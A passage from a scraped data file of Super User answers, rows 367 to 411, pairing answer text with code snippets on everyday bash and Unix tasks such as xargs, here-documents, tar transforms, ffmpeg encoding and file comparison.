</code>, <code>sudo</code>, <code>sudo http_proxy=""$http_proxy"" wget -q --tries=10 --timeout=20 --spider http://google.com
</code>, <code>sudo -E</code>, <code>sudo -E wget -q --tries=10 --timeout=20 --spider http://google.com
</code>, <code>sudo</code>]"
367,https://superuser.com/questions229883/,"['One significant difference is that cp truncates the destination file and starts copying data from the source into the destination file.', 'install, on the other hand, removes the destination file first.', ""This is significant because if the destination file is already in use, bad things could happen to whomever is using that file in case you cp a new file on top of it. e.g. overwriting an executable that is running might fail. Truncating a data file that an existing process is busy reading/writing to could cause pretty weird behavior. If you just remove the destination file first, as install does, things continue much like normal - the removed file isn't actually removed until all processes close that file.""]",[<code>cp</code>]
368,https://superuser.com/questions472266/,"['In addition to calling /bin/cp, you could do one of:', ""However, I agree that you should not get accustomed to using an alias like cp -i or rm -i -- if you sit down at a different shell, you won't have the safety net you've become dependent on.""]","[<code>/bin/cp</code>, <code>\cp -f ...
command cp -f ...
</code>, <code>cp -i</code>, <code>rm -i</code>]"
369,https://superuser.com/questions606212/,"['To test out the keybinding with eg. Ctrl-b:', 'For permanent usage, add it to ~/.inputrc']","[<code>bind -P |grep unix-filename-rubout
</code>, <code>bind \\C-b:unix-filename-rubout
</code>, <code>~/.inputrc</code>]"
370,https://superuser.com/questions568245/,"['I guess you are looking for the -o argument:', '-o format:', 'user-defined format.\n  format is a single argument in the form of a\n  blank-separated or comma-separated list, which offers a\n  way to specify individual output columns. The\n  recognized keywords are described in the STANDARD\n  FORMAT SPECIFIERS section below. Headers may be renamed\n  (ps -o pid,ruser=RealUser -o comm=Command) as desired.\n  If all column headers are empty (ps -o pid= -o comm=)\n  then the header line will not be output. Column width\n  will increase as needed for wide headers; this may be\n  used to widen up columns such as WCHAN\n  (ps -o pid,wchan=WIDE-WCHAN-COLUMN -o comm). Explicit\n  width control (ps opid,wchan:42,cmd) is offered too.\n  The behavior of ps -o pid=X,comm=Y varies with\n  personality; output may be one column named ""X,comm=Y""\n  or two columns named ""X"" and ""Y"". Use multiple -o\n  options when in doubt. Use the PS_FORMAT environment\n  variable to specify a default as desired; DefSysV and\n  DefBSD are macros that may be used to choose the\n  default UNIX or BSD columns.', 'So the command you want would be (Ubuntu):', 'under OpenSolaris the command is:']","[<code>ps -o uid,pid,cmd -ef|grep python
</code>, <code>ps -o ruser,pid,comm -ef|grep python
</code>]"
371,https://superuser.com/questions120078/,"['You need to use the keyword -- to tell the mv command that the arguments are not to be interpreted as options.  Watch:', ""Use -- after all the options on the commandline.  Eg, if you're trying to use the -i option to mv, it would go before --:""]","[<code>--</code>, <code>$ mv -N1.ext x-f1.ext
mv: invalid option -- N
Try `mv --help' for more information.

$ mv -- -N1.ext x-f1.ext
$ ls
x-f1.ext
</code>, <code>--</code>, <code>-i</code>, <code>--</code>, <code>mv -i -- -filename-begins-with-dash newfilename
</code>]"
372,https://superuser.com/questions466031/,['You can try ghostscript with ebook output and the bookmarks seems to be preserved:'],"[<code>gs -sDEVICE=pdfwrite -dNOPAUSE -dBATCH -dPDFSETTINGS=/ebook -sOutputFile=newFile.pdf originalFile.pdf
</code>]"
373,https://superuser.com/questions86915/,"[""I couldn't get Dennis' very simple one-liner to work, so here's a far more convoluted method.  I'd try his first."", 'As mentioned, you can use exec to redirect standard error & standard out for the entire script.  Like so:\nexec > $LOGFILE 2>&1\nThis will output all stderr and stdout to $LOGFILE.', ""Now, since you want to have this displayed to the console as well as a logfile, you're also going to have to use a named pipe for exec to write to, and tee to read from.\n(Dennis' one-liner technically does this as well, although obviously in a different way)  The pipe itself is created with mkfifo $PIPEFILE.  Then do the following."", 'If you want to be thorough, you can create and destroy the named pipe file at the start and end of your script.', ""For the record, I gleaned most of this from a random guy's very informative blog post: (Archived version)""]","[<code>exec &gt; $LOGFILE 2&gt;&amp;1</code>, <code>mkfifo $PIPEFILE</code>]"
374,https://superuser.com/questions234158/,"[""You could run stat -c '%x %z' filename.txt""]",[<code>stat -c '%x %z' filename.txt</code>]
375,https://superuser.com/questions1249828/,"['This is because bash and echo -e combined. From man 1 bash', 'A non-quoted backslash (\\) is the escape character. It preserves the literal value of the next character that follows, with the exception of <newline>. […]', 'Enclosing characters in double quotes preserves the literal value of all characters within the quotes, with the exception of $, `, \\, […] The backslash retains its special meaning only when followed by one of the following characters: $, `, "", \\, or <newline>.', 'The point is: double quoted backslash is not always special.', ""There are various implementations of echo in general, it's a builtin in bash; the important thing here is this behavior:"", 'If -e is in effect, the following sequences are recognized:\n\\\\\nbackslash\n[…]\n\\n\nnew line', 'Now we can decode:', ""And so on. As you can see, up to four consecutive backslashes give one in result. That's why you need (at least) nine of them to get three. 9=4+4+1."", 'Now with \\n:', 'The results would be different with \' instead of "" (due to different bash behavior) or without -e (different echo behavior).']","[<code>bash</code>, <code>echo -e</code>, <code>man 1 bash</code>, <code>\</code>, <code>&lt;newline&gt;</code>, <code>$</code>, <code>`</code>, <code>\</code>, <code>$</code>, <code>`</code>, <code>""</code>, <code>\</code>, <code>&lt;newline&gt;</code>, <code>echo</code>, <code>bash</code>, <code>-e</code>, <code>\\</code>, <code>\n</code>, <code>echo -e ""\ Hello!""</code>, <code>bash</code>, <code>echo</code>, <code>\</code>, <code>echo -e ""\\ Hello!""</code>, <code>\</code>, <code>bash</code>, <code>\</code>, <code>echo</code>, <code>\ Hello!</code>, <code>echo -e ""\\\ Hello!""</code>, <code>\</code>, <code>bash</code>, <code>\</code>, <code>echo</code>, <code>\\ Hello!</code>, <code>-e</code>, <code>\\</code>, <code>\</code>, <code>echo -e ""\\\\ Hello!""</code>, <code>\</code>, <code>bash</code>, <code>\</code>, <code>echo</code>, <code>\\ Hello!</code>, <code>-e</code>, <code>\\</code>, <code>\</code>, <code>echo -e ""\\\\\ Hello!""</code>, <code>\</code>, <code>bash</code>, <code>\</code>, <code>echo</code>, <code>\\\ Hello!</code>, <code>-e</code>, <code>\\</code>, <code>\</code>, <code>\</code>, <code>\n</code>, <code>echo -e ""\n Hello!""</code>, <code>bash</code>, <code>-e</code>, <code>\n</code>, <code>echo -e ""\\n Hello!""</code>, <code>bash</code>, <code>\\</code>, <code>\</code>, <code>echo</code>, <code>\n Hello!</code>, <code>echo -e ""\\\n Hello!""</code>, <code>bash</code>, <code>\\</code>, <code>\</code>, <code>echo</code>, <code>\\n Hello!</code>, <code>-e</code>, <code>\\</code>, <code>\</code>, <code>'</code>, <code>""</code>, <code>bash</code>, <code>-e</code>, <code>echo</code>]"
376,https://superuser.com/questions1428322/,"['Do:', ""and compare content, you'll see the difference."", 'Aliasing ls to /bin/ls --color=auto is likely better idea, it will stop ls from using color codes when not writing directly to terminal (like when piping to next program or writing to a file).']","[<code>/bin/ls --color &gt; file1
/bin/ls &gt; file2
</code>, <code>ls</code>, <code>/bin/ls --color=auto</code>, <code>ls</code>]"
377,https://superuser.com/questions49562/,"['/etc/bash.bashrc applies to all users', '~/.bashrc only applies to the user in which home folder it is.']","[<code>/etc/bash.bashrc</code>, <code>~/.bashrc</code>]"
378,https://superuser.com/questions543397/,"['What you have there is a dangling symlink, or a symlink pointing to a file or directory which no longer exists.', ""A symlink itself really has no filesize, because it isn't a file. Symlinks are stored within the inodes themselves, meaning they have no real contents or size, but are instead pointers to other files on the disk."", ""The output of file libCLHEP-Exceptions-2.1.3.1.a should reveal where it's pointing to.""]",[<code>file libCLHEP-Exceptions-2.1.3.1.a</code>]
379,https://superuser.com/questions138282/,"['In bash you can use:', 'or', 'to delete FOO13, FOO14 and FOO15.', 'Bash expansions brace are documented here.']",[]
380,https://superuser.com/questions246061/,"[""Why can't I use a command like this to find all the pdf files in a directory and subdirectories?"", 'The wildcard *.pdf in your command is expanded by bash to all matching files in the current directory, before executing ls.', ""How do I do it? (I'm using bash in ubuntu)"", 'find is your answer.', 'is recursive listing of pdf files. -iname is case insensitive match, so', 'lists all .pdf files, including for example foo.PDF', 'Also, you can use ls for limited number of subfolders, for example', 'to find all pdf files in subfolders (matches to bar/foo.pdf, not to bar/foo/asdf.pdf, and not to foo.PDF).', 'If you want to remove files found with find, you can use']","[<code>*.pdf</code>, <code>bash</code>, <code>ls</code>, <code>find . -name \*.pdf
</code>, <code>-iname</code>, <code>find . -iname \*.pdf
</code>, <code>foo.PDF</code>, <code>ls *.pdf */*.pdf
</code>, <code>find . -iname \*.pdf -delete
</code>]"
381,https://superuser.com/questions315386/,['Just press Ctrl-L on the keyboard.'],[]
382,https://superuser.com/questions556463/,"['Note: This information is based on the FFmpeg Wiki on VP9 encoding. Please refer to that article for more information – it will be continuously maintained and extended. For the best results you should use the a recent version of ffmpeg by downloading it from their website (a static build will suffice; it contains the libvps-vp9 encoder).', 'VBR encoding gives you the optimal overall quality, since the encoder can freely choose how many bits to assign to a frame. Choose this mode unless you are preparing videos for constant-bitrate streaming.', 'Typically, if you do not want to target a specific file size, you should let the bitrate vary freely, as that will lead to the highest quality. You can do this by setting the bitrate to 0 and the constant rate factor (CRF) to the target quality level:', 'CRF value can be from 0–63. Lower values mean better quality. Recommended values range from 15–35, with 31 being recommended for 1080p HD video. Google has a guide with more info on that.', ""If you want your file to have a specific target bitrate or file size, you need to specify the rate and use two-pass encoding (which will ensure an optimal quality distribution). Here we're choosing 5 MBit/s, which should be enough for 1080p content."", 'Windows users need to use NUL instead of /dev/null, and a ^ instead of \\.', 'First of all, libvpx offers constant bitrate and variable bitrate encoding modes. Constant bitrate should be avoided whenever possible (unless you target a specific file size or streaming scenario), since the average quality per file size will be worse. Still, you could try setting a constant bitrate if nothing else works for you, e.g. with 1 MBit/s:', 'Look at the output and increase or decrease the bit rate to your liking (or file size constraints). For example, you can use 500K or 5M, et cetera.', ""You have to specify -minrate, -maxrate and the bitrate -b:v in order for the encoder to use CBR. They all have to have the same value—otherwise it'll choose a different target bitrate instead and do VBR encoding, but with bad quality."", 'The current audio codec of choice for VP9 encoding is Opus. FFmpeg will choose the necessary encoder and its options by default. If you want to explicitly set -c:a libopus, you can do that as well. Refer to the libopus documentation for more options.']","[<code>ffmpeg</code>, <code>libvps-vp9</code>, <code>ffmpeg -i input.mp4 -c:v libvpx-vp9 -crf 30 -b:v 0 output.webm
</code>, <code>ffmpeg -i input.mp4 -c:v libvpx-vp9 -b:v 5M -pass 1 -f webm /dev/null &amp;&amp; \
ffmpeg -i input.mp4 -c:v libvpx-vp9 -b:v 5M -pass 2 output.webm
</code>, <code>NUL</code>, <code>/dev/null</code>, <code>^</code>, <code>\</code>, <code>ffmpeg -i input.mp4 -c:v libvpx-vp9 -minrate 5M -maxrate 5M -b:v 5M output.webm
</code>, <code>500K</code>, <code>5M</code>, <code>-minrate</code>, <code>-maxrate</code>, <code>-b:v</code>, <code>-c:a libopus</code>, <code>libopus</code>]"
383,https://superuser.com/questions861077/,"['Just use echo...put it in front of the command you want to expand. I use this quite frequently.', 'You can use Home and Del to quickly add/remove the preceding echo.', 'EDIT\nAs pointed out in the comments, this will not work if the command is not just a simple command (like if it is a for loop, uses the pipe |, or && or anything else like that).']","[<code>echo</code>, <code>$ ls
one.txt
two.txt
three.dat
$ echo rm *.txt
rm one.txt two.txt
$ rm *.txt
</code>, <code>echo</code>, <code>for</code>, <code>|</code>, <code>&amp;&amp;</code>]"
384,https://superuser.com/questions178412/,"['Go to vim and run:', 'Usually the value will be something like:\n/usr/share/vim/vim72\nThen edit (using root) the file /usr/share/vim/vim72/filetype.vim\nSearch for bashrc.\nYou will find a line that looks like this:', '\nEdit the line and add your filename (.bash_aliases) to it.', ""That's it, now it should work.""]","[<code>:echo $VIMRUNTIME
</code>, <code>au BufNewFile,BufRead .bashrc*,bashrc,bash.bashrc,.bash_profile*,.bash_logout*,*.bash,*.ebuild call SetFileTypeSH(""bash"")
</code>]"
385,https://superuser.com/questions580743/,"['The cp man page does not list any options that would allow you to do this just with the CP command.  If you are wanting to just issue a command and ""walk away"", you can put the 2 commands on 1 line separated by a ;  to automatically execute the commands in sequence.']",[]
386,https://superuser.com/questions694501/,"['The $@ variable expands to all the parameters used when calling the function, so', 'would display 1 2 3. If not used inside a function, it specifies all parameters used when calling the script. See the bash manual page for more info.']","[<code>$@</code>, <code>function foo()
{
    echo ""$@""
}

foo 1 2 3
</code>, <code>1 2 3</code>]"
387,https://superuser.com/questions113103/,"['Try this:', 'then press alt+.', 'depending on your OS and terminal you might have to type\n    esc then .', 'You can also press     alt+1+. to pick a specific prior argument.', 'This is much better than !! or !$ because you can actually see what you are about to run, and it takes less keystrokes anyway.', 'edit: strictly speaking it is meta not alt, so it might also work with the ""windows"" key depending on how your keyboard is setup..']","[<code>mkdir /where/the/hell/is/that/thing
</code>]"
388,https://superuser.com/questions724301/,"['According to your file output, this program is for GNU/Linux. I know this because:', 'To solve your problem, you must either run this problem within a Linux distribution, recompile the program, or get the Mac OS X version of this program.', ""Just as people speak different languages, different computers understand different instructions. For instance, your Mac uses an Intel processor, while your Android phone uses an ARM processor. Compare these two processors to English and French. They may belong to the same language family, but still, you can't speak both at the same time. This leads to a conclusion:"", 'Dissimilar computers ""talk"" in different tongues.', ""As for why different operating systems (such as Windows, Mac OS X, and Linux) can't use the same binaries, consider this:"", 'What makes software objectively different to hardware? Not much.', 'Both provide a system and a ""language"" that allows for more complex components of the computer to complete tasks for the end user. Both require an agreed language to get work done. Imagine if there were 10 people in a shouting match, each speaking a different language. This is why different OS software need different binaries, even if both operating systems use the same processor.']","[<code>file</code>, <code>b1</code>, <code>ELF</code>, <code>Mach-O</code>, <code>file</code>, <code>GNU/Linux 2.6.18</code>, <code>b1</code>]"
389,https://superuser.com/questions221001/,"['Upload a file on each remote machine, say ~/.my_custom_bashrc, with your custom bash configuration, (in this case PS1=...) then launch ssh with:', 'You can easily use a bash function as wrapper for readability.']","[<code>~/.my_custom_bashrc</code>, <code>bash</code>, <code>PS1=...</code>, <code>ssh</code>, <code>ssh user@host -t ""bash --rcfile ~/.my_custom_bashrc -i""
</code>, <code>bash</code>]"
390,https://superuser.com/questions917211/,"['In simple terms, a command is an instruction (or a set of instructions) to be carried out by a computer.', 'Fundamental Unix utilities such as ls, ln, etc. are (usually) written in C and compiled to be stand-alone executable programs that don’t require an interpreter to be executed; they usually require certain library files to be installed on the system but that’s an answer for another question.', 'A script is a collection of commands and in fact, scripts themselves are considered to be a command.', 'A Perl script is a sequence of Perl statements and requires a perl executable (stand-alone and compiled) program to interpret the Perl statements.', 'Sometimes large and complex interpretative scripts (in languages such as Perl, Python and Ruby) are also referred to as interpreted programs while the term script is reserved for shorter and simpler scripts.', 'A shell script is a sequence of other commands (any type of command) and it requires a Unix shell such as Bash to interpret the script. From the Bash man page:', 'Bash is an sh-compatible command language interpreter that executes commands read from the standard input or from a file.', 'Shells usually have built-in commands which are neither stand-alone programs nor scripts. Instead, they are part of the shell itself and run directly by the shell. cd is an example of such a built-in command.', 'Some times there are commands which exist as shell built-ins and as\nstand-alone commands at the same time, e.g., the echo command.', 'echo on its own executes the shell built-in while the stand-alone command can be executed by providing its full path.', 'Run built-in version of echo:', 'Run stand-alone echo program:', 'Note: The above specifics refer to a Unix environment but the same principles apply to a Windows environment.']","[<code>ls</code>, <code>ln</code>, <code>perl</code>, <code>cd</code>, <code>echo</code>, <code>$ type -a echo
echo is a shell builtin
echo is /usr/bin/echo
</code>, <code>echo</code>, <code>$ echo --version
--version
</code>, <code>echo</code>, <code>$ /usr/bin/echo --version
echo (GNU coreutils) 8.23
Packaged by Cygwin (8.23-4)
Copyright (C) 2014 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;.
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
</code>]"
391,https://superuser.com/questions493270/,"['You have to run ssh-host-config first. It will generate a ""ssh_config"" file in /etc/.']",[]
392,https://superuser.com/questions35179/,"['You can do something like this:', 'wait will wait for all programs ran in background from current shell - i.e. this wget.', 'After wait will finish - shutdown will go on.']",[]
393,https://superuser.com/questions595510/,"['The GNU version of tar supports the --transform option (and its alias --xform), you could use it like this', 'For example, given this directory tree', 'the command ', 'will produce an archive like']","[<code>tar</code>, <code>--transform</code>, <code>--xform</code>, <code>tar --transform ""s/^$MYPATH/$VERSION/"" -cf archive.tar.bz2 ""$MYPATH""
</code>, <code>foo
└── foo.txt
</code>, <code>tar --transform ""s/^foo/bar/"" -cf foo.tar.bz2 foo
</code>, <code>$ tar -tf foo.tar.bz2
bar/
bar/foo.txt
</code>]"
394,https://superuser.com/questions1209172/,"['Because the command substitution is inside double-quotes, it is evaluated at the time that the command is defined.  This causes find to look through your hard disk contents while .bashrc is running.', 'You, by contrast, appear to want it evaluated at the time of use.  In that case, use single quotes:', 'Note that this alias will fail if any of the files found have whitespace in their names.  To avoid that:', 'This latter form will work reliably for any kind of file name.']","[<code>find</code>, <code>.bashrc</code>, <code>alias prog='/path/to/script.sh $(find ""$(pwd)"" -name prog)'
</code>, <code>alias prog='find . -name prog -exec /path/to/script.sh {} +'
</code>]"
395,https://superuser.com/questions210054/,"['The following ifnotempty function pipes its input to the command passed as an argument, except that it does nothing if the input is empty. Use it to pipe source --foo into sink --bar by writing source --foo | pipe_if_not_empty sink --bar.', 'Design notes:', ""If you don't mind storing the whole intermediate data in memory, here is a very slightly simpler implementation of pipe_if_not_empty."", 'Here is a slightly simpler implementation with the following caveats:', 'Again, the whole data is stored in memory.']","[<code>ifnotempty</code>, <code>source --foo</code>, <code>sink --bar</code>, <code>source --foo | pipe_if_not_empty sink --bar</code>, <code>pipe_if_not_empty () {
  head=$(dd bs=1 count=1 2&gt;/dev/null; echo a)
  head=${head%a}
  if [ ""x$head"" != x"""" ]; then
    { printf %s ""$head""; cat; } | ""$@""
  fi
}
</code>, <code>dd</code>, <code>head -c 1</code>, <code>dd bs=1 count=1 2&gt;/dev/null</code>, <code>head -n 1</code>, <code>head</code>, <code>read -r head</code>, <code>read -r -n 1 head</code>, <code>head</code>, <code>head=$(head -c 1)</code>, <code>cat</code>, <code>&lt;/dev/stdin</code>, <code>pipe_if_not_empty</code>, <code>pipe_if_not_empty () {
  input=$(cat; echo a);
  if [ ""x$input"" != x""a"" ]; then
    { printf %s ""${input%a}""; } | ""$@""
  fi
}
</code>, <code>pipe_if_not_empty () {
  input=$(cat);
  if [ ""x$input"" != x"""" ]; then
    { printf '%s\n' ""${input}""; } | ""$@""
  fi
}
</code>]"
396,https://superuser.com/questions585398/,"[""To feed text into a program's stdin, use pipes and/or redirection:"", ""In case of interactive CLI programs (not full-terminal ones), it is possible to use named pipes or coprocesses as a sort of poor-man's expect (which you ruled out due to being Tcl):"", ""(Be careful when reading from the output pipe; e.g. head -1 <out won't just read one line – it'll buffer one full 4k block, print one line, discard the rest.)""]","[<code>echo 1 | myprogram

(echo ""First line""
 echo ""Second line"") | myprogram

myprogram &lt;&lt;EOF
First line
Second line
EOF
</code>, <code>expect</code>, <code>mkfifo in out
myprogram &lt;in &gt;out &amp;
echo ""First line"" &gt;in
read -r reply &lt;out

mkfifo in out
myprogram &lt;in &gt;out &amp;
exec {infd}&gt;in {outfd}&lt;out
echo ""First line"" &gt;&amp;$infd
read -r reply &lt;&amp;$outfd

coproc foo { myprogram; }
echo ""First line"" &gt;&amp;${foo[1]}
read -r reply &lt;&amp;${foo[0]}
</code>, <code>head -1 &lt;out</code>]"
397,https://superuser.com/questions1381285/,"['Creating hashes to compare files makes sense if you compare one file against many, or when comparing many files against each other.', 'It does not make sense when comparing two files only once: The effort to compute the hashes is at least as high as walking over the files and comparing them directly.', 'An efficient file comparison tool is cmp:', 'You can also combine it with dd to compare arbitrary parts (not necessarily from the beginning) of two files, e.g.:']","[<code>cmp</code>, <code>cmp --bytes $((100 * 1024 * 1024)) file1 file2 &amp;&amp; echo ""File fragments are identical""
</code>, <code>dd</code>, <code>cmp \
    &lt;(dd if=file1 bs=100M count=1 skip=1 2&gt;/dev/null) \
    &lt;(dd if=file2 bs=100M count=1 skip=1 2&gt;/dev/null) \
&amp;&amp; echo ""File fragments are identical""
</code>]"
398,https://superuser.com/questions1452496/,"['The execution is not allowed because the file is on a filesystem mounted with the ""noexec"" option. Use findmnt -u -T . to find out if that\'s the case. If you have root privileges, mount -o remount,exec <dir> should remove this option.', ""The execution is not allowed by MAC policies (SELinux, SMACK, possibly AppArmor). Check the system logs, starting with journalctl -n 100 and dmesg. Bypassing this (if you're the administrator) depends on which MAC system is actually in use.""]","[<code>findmnt -u -T .</code>, <code>mount -o remount,exec &lt;dir&gt;</code>, <code>journalctl -n 100</code>, <code>dmesg</code>]"
399,https://superuser.com/questions168971/,"['You could try a bash function to pass the arguments before the ampersand:', 'BUT the bigger issue may be the whole idea of not waiting until Notepad++ exits. Shell commands which use $EDITOR typically are designed to wait until the editor sends back an indication that the editing has completed. This usually means that the editor has exited (e.g. with vi or nano). ', ""Emacs has a way to set your EDITOR to emacsclient and then when you're done editing, you hit a magical keystroke (C-x #) to indicate that editing is complete. If Notepad++ had something similar for cygwin users, I can see how this would work."", 'Another alternative is to use plain, boring, simple Notepad as your EDITOR and reserve Notepad++ for heavy use (I got the idea from this blog post)']","[<code>bash</code>, <code>np ()
{
    /cygdrive/c/Program\ Files/Notepad++/notepad++.exe $* &amp;
}
</code>, <code>$EDITOR</code>, <code>vi</code>, <code>nano</code>, <code>EDITOR</code>, <code>emacsclient</code>, <code>C-x #</code>]"
400,https://superuser.com/questions385766/,"[""It's not a login shell."", 'If a shell is a login shell, it will look for .bash_profile if it exists, then .profile.\nOther shells look for .bashrc', 'So, you can put the things you want in every shell instance in .bashrc, and possibly have a reference that sources .bashrc in .profile.', 'So:\n.bashrc:', 'end of .profile:']","[<code>stuff you want
</code>, <code>[ -n ""$BASH"" ] &amp;&amp; [ -f ~/.bashrc ] &amp;&amp; . ~/.bashrc
</code>]"
401,https://superuser.com/questions519882/,"['The -s thing is called an option. In your case, it means that bash will be executed with the first positional parameter set. If you want to play with that:', 'In your case, the script downloaded via curl is sent to bash (so it will be executed) and will have the first positional parameter set to stable.', ""If ever you're stuck with options you don't know what they do: man bash and then type /-s this will more or less get you to where the -s option is described. Or if you want to know what the -u option does for sed: man sed and then type /-u."", 'Hope this helps!']","[<code>-s</code>, <code>bash</code>, <code>$ bash -s let us set some positional parameters just for fun
$ # doh? nothing seemed to happen
$ # In fact here we're in a new instance of bash with the parameters set. Look:
$ echo ""$3""
set
$ echo ""$5""
positional
$ # Get it?
$ printf ""%s\n"" ""$@""
let
us
set
some
positional
parameters
just
for
fun
$ # Amazing!
$ # Let's get out of here!
$ exit
$ # (back to previous bash session)
$
</code>, <code>bash</code>, <code>stable</code>, <code>man bash</code>, <code>/-s</code>, <code>-s</code>, <code>-u</code>, <code>sed</code>, <code>man sed</code>, <code>/-u</code>]"
402,https://superuser.com/questions655264/,"['The -I requires a defined placeholder.  The -i option will assume {} is the placeholder.  This was where I found any assumption of {} in man xargs at least on Cygwin and CentOS.', 'xargs called without either option does not need the placeholder and it just appends the STDIN to the end of the arguments.', 'Just add echo to your examples to see what xargs is doing:', 'Your example mistakenly uses {}:', 'so the file cmd sees args of {} Hello World and errors.', 'If you want to explicitly use {} in your xargs call:', 'Or with No placeholder:', 'xargs as called above does not need the {}. It appends the STDIN to the end of the command without a placeholder.  The use of {} usually means you want the STDIN somewhere in the middle of the cmd to execute, as in:']","[<code>-I</code>, <code>-i</code>, <code>{}</code>, <code>man xargs</code>, <code>echo</code>, <code>$ ls -1
Hello World/
</code>, <code>{}</code>, <code>$ ls -1 | xargs echo file {}
file {} Hello World/
</code>, <code>file</code>, <code>{} Hello World</code>, <code>{}</code>, <code>$ ls -1 | xargs -I{} echo file {}
file Hello World/
</code>, <code>$ ls -1 | xargs echo file
file Hello World/
</code>, <code>$ ls -1 | xargs -i mv {} /path/to/someplace/.
</code>]"
403,https://superuser.com/questions456615/,"['or even', 'Worked for me.', ""Looks like when you take ==end in the ' variable doesn't substitute."", 'ah, here it is in the man page (look 3.6.6):', 'The format of here-documents is:', 'No  parameter expansion, command substitution, arithmetic expansion, or\n  pathname expansion is performed on word.  If any characters in word are\n  quoted,  the  delimiter is the result of quote removal on word, and the\n  lines in the here-document are not expanded.  If word is unquoted,  all\n  lines  of  the here-document are subjected to parameter expansion, command substitution, and arithmetic expansion. [...]']","[<code>cat &lt;&lt;EOF &gt; test
My name is $NAME
EOF
</code>, <code>cat &lt;&lt;==end &gt; test
My name is $NAME
==end
</code>, <code>==end</code>, <code>'</code>, <code>      &lt;&lt;[-]word
              here-document
      delimiter
</code>]"
404,https://superuser.com/questions195598/,"['In Bash 4, you can use associative arrays:', 'To set up the array initially you could also do direct assignments:', 'or this way:']","[<code># set up array of constants
declare -A array
for constant in foo bar baz
do
    array[$constant]=1
done

# test for existence
test1=""bar""
test2=""xyzzy""

if [[ ${array[$test1]} ]]; then echo ""Exists""; fi    # Exists
if [[ ${array[$test2]} ]]; then echo ""Exists""; fi    # doesn't
</code>, <code>array[foo]=1
array[bar]=1
# etc.
</code>, <code>array=([foo]=1 [bar]=1 [baz]=1)
</code>]"
405,https://superuser.com/questions276701/,"['I guess you have to escape the $ sign:', 'otherwise it would be interpreted by the shell which would result in an empty string ("""") - i.e. awk would print the whole line.']","[<code>$</code>, <code>watch ""ps -ef | awk -F' ' '{print \$2}'""
</code>, <code>""""</code>, <code>awk</code>]"
406,https://superuser.com/questions995617/,"[""For the bash shell, '{}' and {} are interchangeable.  This is not be the case with all shells (such as fish)."", 'Putting the argument in single quotes explicitly indicates that the curly braces should be sent to find.  Depending on the usage, the bash shell sometimes substitutes the contents of curly brackets.', ""As seen below, bash does not substitute empty brackets, and they get passed to the command.  For the find command, it doesn't matter.""]","[<code>bash</code>, <code>'{}'</code>, <code>{}</code>, <code>fish</code>, <code>find</code>, <code>find</code>, <code>$ echo {}
{}

$ echo {1}
{1}

$ echo {1,3}
1 3

$ echo '{1,3}'
{1,3}
</code>]"
407,https://superuser.com/questions382333/,"['with grep you could specifiy the -s flag which does pretty much what @ortang said', ""-s, --no-messages\n                Suppress error messages about nonexistent or unreadable files.  Portability note: unlike GNU grep, 7th Edition Unix grep did\n  not conform to POSIX, because it  lacked  -q  and  its  -s  option\n                behaved like GNU grep's -q option.  USG-style grep also lacked -q but its -s option behaved like GNU grep.  Portable shell\n  scripts should avoid both -q and -s and should redirect standard and\n                error output to /dev/null instead."", 'with find as far as I know @ortangs answer is the best. \nsomething like', 'find / -name ""myfile"" -type f -print 2>/dev/null']","[<code>find / -name ""myfile"" -type f -print 2&gt;/dev/null</code>]"
408,https://superuser.com/questions375690/,"['Something like this will do the trick and preserve full path, handle space, rename folder/movie.mov to folder/movie.flv, etc.', 'And if I misunderstood you and you want all the .flv movies in the current directory, use this one instead:']","[<code>folder/movie.mov</code>, <code>folder/movie.flv</code>, <code>find . -name ""*.mov"" | while read movie;do
  ffmpeg -i ""$movie"" -f flv ""${movie%.mov}.flv""
done
</code>, <code>find . -name ""*.mov"" | while read movie;do
  ffmpeg -i ""$movie"" -f flv ""$(basename ""${movie%.mov}.flv"")""
done
</code>]"
409,https://superuser.com/questions381394/,"['How to do this best depends on what you want:', 'If you want a single part of the file, your idea to use gunzip and head is right. You can use:', 'That would output the first 4000000 lines on standard out - you probably want to append another pipe to actually do something with the data.', ""To get the other parts, you'd use a combination of head and tail, like:"", 'to get the second block.', 'Is perhaps doing a series of these a solution or would the gunzip -c\n  require enough space for the entire file to be unzipped', 'No, the gunzip -c does not require any disk space - it does everything in memory, then streams it out to stdout.', ""If you want to create all the parts in one go, it is more efficient to create them all with a single command, because then the input file is only read once. One good solution is to use split; see jim mcnamara's answer for details.""]","[<code>gunzip</code>, <code>head</code>, <code>gunzip -c hugefile.txt.gz | head -n 4000000
</code>, <code>head</code>, <code>tail</code>, <code>gunzip -c hugefile.txt.gz | head -n 8000000 |tail -n 4000000
</code>, <code>gunzip -c</code>, <code>split</code>]"
410,https://superuser.com/questions498312/,"['Just putting all my comments together for an answer:', 'First thing you should do is change the shell, this way you can set a shell that will not load the bash init-scripts (.bashrc, .bash_profile) - how to do this for the Mac OS X terminal app can be seen here: Apple Support', 'Now you should be able to open a terminal again and use your favourite command-line editor to open the .bash_profile file (e.g. nano or vi):', 'In this file you have to reset your PATH variable that is used by the terminal to find the programs it can execute.', 'This can be done with the following two lines:', 'This will first set the directories that you want to have on your PATH and the export this PATH to make it available to all programs started from this shell (via export).']","[<code>.bashrc</code>, <code>.bash_profile</code>, <code>.bash_profile</code>, <code>nano</code>, <code>vi</code>, <code>PATH</code>, <code>PATH=""/usr/bin:/bin:/usr/sbin:/sbin:/usr/local/bin:$PATH"" # Make sure to use double quotes not single quotes And on a new line 
export PATH
</code>]"
411,https://superuser.com/questions559772/,"['od will replace runs of the same thing with *, so you can easily use it to scan for nonzero bytes:', 'You can combine this with either dd or pv to get a progress display while the scan is taking place:']","[<code>od</code>, <code>*</code>, <code>$ sudo od /dev/disk2 | head
0000000    000000  000000  000000  000000  000000  000000  000000  000000
*
234250000
</code>, <code>dd</code>, <code>pv</code>, <code>$ sudo dd if=/dev/disk2 bs=1M status=progress | od | head

# or:

$ sudo pv /dev/disk2 | od | head
</code>]"
